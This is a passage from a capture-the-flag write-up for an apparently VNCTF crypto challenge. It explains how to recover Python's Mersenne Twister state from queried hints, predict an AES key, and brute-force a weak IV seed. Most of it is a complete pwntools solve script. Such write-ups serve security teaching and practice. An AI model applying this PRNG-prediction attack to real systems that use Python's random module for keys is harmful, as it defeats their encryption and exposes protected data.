   The AES key is generated immediately after the hints: `key = random.getrandbits(128)`.

   - The `hints` exhaust the first batch of 624 random numbers.
   - When `getrandbits` is called next, the generator triggers a "Twist" operation to update its state and generate the next 624 numbers.
   - The `getrandbits(128)` call consumes the first 4 numbers of this *new* batch.
   - The Twist operation computes the new state `S'[i]` using the old state values `S[i]`, `S[i+1]`, and `S[i+397]`.
   - To predict the first 4 numbers of the new batch (indices 0, 1, 2, 3), we need the old state values at indices **0, 1, 2, 3, 4** and **397, 398, 399, 400**. This requires exactly 9 queries, fitting within the limit of 10.

3. **Weak IV Generation**:

   The Initialization Vector (IV) is `seed * 2` (bytes concatenation). The seed is 8 bytes from `os.urandom(8)`.

   - We cannot recover the seed from the PRNG state because `random.seed(bytes)` hashes the seed with SHA-512 before initialization.
   - However, we can recover the AES Key as described above.
   - Using the Key, we can decrypt the first block of the ciphertext: $P_0 = D_{Key}(C_0) \oplus IV$.
   - Since the flag starts with `VNCTF`, we know the first 5 bytes of the plaintext. This allows us to recover the first 5 bytes of the IV (and thus the seed).
   - We can brute-force the remaining 3 bytes of the seed ($2^{24} \approx 16.7$ million possibilities) and verify the correct seed by checking if `random.seed(candidate)` reproduces the hints we observed.

### Solution Script

Save the following code as `solve.py`. You will need `pwntools` and `pycryptodome`.

Python

```python
from pwn import *
from Crypto.Cipher import AES
from Crypto.Util.Padding import unpad
import random
import sys

# --- MT19937 Helper Functions ---

def undo_right_shift_xor(val, shift):
    """Reverses y ^= (y >> shift)"""
    res = val
    for _ in range(32 // shift + 1):
        res = val ^ (res >> shift)
    return res

def undo_left_shift_xor_mask(val, shift, mask):
    """Reverses y ^= ((y << shift) & mask)"""
    res = val
    for _ in range(32 // shift + 1):
        res = val ^ ((res << shift) & mask)
    return res

def untemper(y):
    """Reverses the MT19937 tempering function to recover internal state."""
    # Reverse order of tempering operations
    y = undo_right_shift_xor(y, 18)
    y = undo_left_shift_xor_mask(y, 15, 0xefc60000)
    y = undo_left_shift_xor_mask(y, 7, 0x9d2c5680)
    y = undo_right_shift_xor(y, 11)
    return y

def temper(y):
    """Applies MT19937 tempering."""
    y ^= (y >> 11)
    y ^= (y << 7) & 0x9d2c5680
    y ^= (y << 15) & 0xefc60000
    y ^= (y >> 18)
    return y

def twist_next(mt_idx, mt_idx_1, mt_idx_m):
    """
    Simulates the MT19937 twist for a single index.
    Requires state at [i], [i+1], and [i+397].
    """
    UPPER_MASK = 0x80000000
    LOWER_MASK = 0x7fffffff
    MATRIX_A = 0x9908b0df

    y = (mt_idx & UPPER_MASK) | (mt_idx_1 & LOWER_MASK)
    next_val = mt_idx_m ^ (y >> 1)
    if y % 2 != 0:
        next_val ^= MATRIX_A
    return next_val

# --- Main Exploit ---

def solve():
    # Configuration: Update HOST and PORT for the actual challenge
    if len(sys.argv) > 2:
        io = remote(sys.argv[1], int(sys.argv[2]))
    else:
        # Defaults to local execution if no args provided
        io = process(['python3', 'chall.py'])

    # 1. Get Encrypted Flag
    io.recvuntil(b"Encrypted flag:\n")
    enc_hex = io.recvline().strip().decode()
    ct = bytes.fromhex(enc_hex)
    log.info(f"Ciphertext: {enc_hex[:32]}...")

    # 2. Query Indices
    # We need to predict the next 4 outputs (Key).
    # This requires recovering state indices [0-4] and [397-400].
    needed_indices = [0, 1, 2, 3, 4, 397, 398, 399, 400]
    hints = {}

    log.info("Querying hints...")
    for idx in needed_indices:
        io.sendlineafter(b"Enter index", str(idx).encode())
        line = io.recvline().decode()
        if "hint[" in line:
            val = int(line.split('=')[1].strip())
            hints[idx] = val

    io.close()

    # 3. Recover State & Predict Key
    log.info("Recovering PRNG state...")
    
    # Untemper hints to get raw state
    state = {i: untemper(hints[i]) for i in needed_indices}

    # Predict the first 4 words of the NEXT batch
    predicted_words = []
    for i in range(4):
        # Calculate next state value using the Twist formula
        raw_next = twist_next(state[i], state[i+1], state[i+397])
        # Temper it to match getrandbits output
        predicted_words.append(temper(raw_next))

    # Construct Key
    # Python getrandbits(128) builds the int from 32-bit chunks, LSB first.
    # Key = Word0 + Word1*2^32 + Word2*2^64 + Word3*2^96
    key_int = predicted_words[0] | (predicted_words[1] << 32) | \
              (predicted_words[2] << 64) | (predicted_words[3] << 96)
    
    key = key_int.to_bytes(16, 'big')
    log.success(f"Recovered Key: {key.hex()}")

    # 4. Recover Seed (IV)
    # IV = seed || seed. Seed is 8 bytes.
    # We decrypt the first block with the Key (using ECB to ignore IV)
    # P[0] = Dec(C[0]) ^ IV[0]  ->  IV[0] = P[0] ^ Dec(C[0])
    
    cipher_check = AES.new(key, AES.MODE_ECB)
    dec_block0 = cipher_check.decrypt(ct[:16])
    
    # Known plaintext attack on the prefix "VNCTF"
    known_prefix = b"VNCTF"
    partial_seed = bytearray(8)
    
    # Recover first 5 bytes of seed
    for i in range(len(known_prefix)):
        partial_seed[i] = dec_block0[i] ^ known_prefix[i]
        
    log.info(f"Partial Seed (5/8 bytes): {partial_seed[:5].hex()}...")
    log.info("Brute-forcing remaining 3 bytes...")

    # Brute force loop
    target_hint = hints[0] # Use the first hint to verify the seed
    found_seed = None
    
    # Iterate 3 bytes (0 to 16,777,215)
    with log.progress('Brute-forcing seed') as p:
        for i in range(1 << 24):
            # Update the last 3 bytes
            suffix = i.to_bytes(3, 'big')
            # Construct candidate seed
            candidate = bytes(partial_seed[:5]) + suffix
            
            # Verify against the PRNG behavior
            # random.seed(bytes) is deterministic
            random.seed(candidate)
            if random.getrandbits(32) == target_hint:
                found_seed = candidate
                p.success(f"Found Seed: {found_seed.hex()}")
                break
                
    if not found_seed:
        log.error("Seed not found. Check constraints.")
        sys.exit(1)

    # 5. Decrypt Final Flag
    iv = found_seed * 2
    cipher = AES.new(key, AES.MODE_CBC, iv)
    try:
        plaintext = unpad(cipher.decrypt(ct), AES.block_size)
        log.success(f"FLAG: {plaintext.decode()}")
    except Exception as e:
        log.error(f"Decryption failed: {e}")

if __name__ == "__main__":
    solve()
```